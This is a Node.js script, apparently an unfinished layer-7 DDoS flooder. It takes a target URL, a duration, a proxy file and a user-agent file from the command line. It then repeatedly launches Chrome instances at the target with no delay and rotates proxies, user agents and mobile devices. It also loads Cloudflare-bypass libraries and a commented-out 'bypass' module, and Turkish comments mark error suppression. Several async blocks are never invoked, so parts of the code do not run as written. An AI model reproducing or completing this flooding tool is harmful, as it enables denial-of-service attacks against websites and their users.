const puppeteer = require('puppeteer');
const devices = require('puppeteer/DeviceDescriptors');
const fs = require('fs');
const fetch = require('popsicle');
var needle = require('needle');
var hooman = require('hooman');
var cloudscraper = require('cloudscraper');
//bypasses = require('./bypass/index');
const ChromeLauncher = require('chrome-launcher');

const EventEmitter = require('events');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
process.setMaxListeners(0);
EventEmitter.defaultMaxListeners = Infinity;
EventEmitter.prototype._maxListeners = Infinity;

//process.on('uncaughtException', function (err) { }); //hataları yok et
//process.on('unhandledRejection', function (err) { }); //hataları yok et

var target = process.argv[2];
var time = process.argv[3];
var proxyfile = process.argv[4];
var userAgentFile = process.argv[5];

var randomProxyString = "0.0.0.0";

const proxies = fs.readFileSync(proxyfile, 'utf-8').replace(/\r/g, '').split('\n');
const userAgents = fs.readFileSync(userAgentFile, 'utf-8').replace(/\r/g, '').split('\n');

var DeviceList = [
    "iPhone 6",
    "iPhone 8",
    "iPhone X"
];

setInterval(() => {
    //console.log(tarayici);
    (async () => {
        const chrome = await ChromeLauncher.launch({
            startingUrl: target.toString(),
            chromeFlags: [`--no-sandbox` /*`--proxy-server=http://127.0.0.1:${this._port}`*/]
        });
        console.log(chrome);
        //await chrome.kill();
    });
    //SetRandomProxy();
    //EmulateBypass(RandomProxy(), RandomUserAgent(), RandomDevice());
});

setTimeout(() => process.exit(0), time * 1000);

function EmulateBypass(proxy, useragent, device)
{ 
    (async () => {
        const chrome = await ChromeLauncher.launch({
            startingUrl: target,
            chromeFlags: [`--no-sandbox` /*`--proxy-server=http://127.0.0.1:${this._port}`*/]
        });
        console.log(chrome);
        //await chrome.kill();
    });
}

function RandomDevice()
{
    return DeviceList[Math.floor(Math.random() * DeviceList.length)];
}

function RandomUserAgent()
{
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function RandomProxy()
{
    return proxies[Math.floor(Math.random() * proxies.length)];
}

function SetRandomProxy()
{
    randomProxyString = RandomProxy();
}

function load(bypassModule) {
    return bypasses[bypassModule]();
}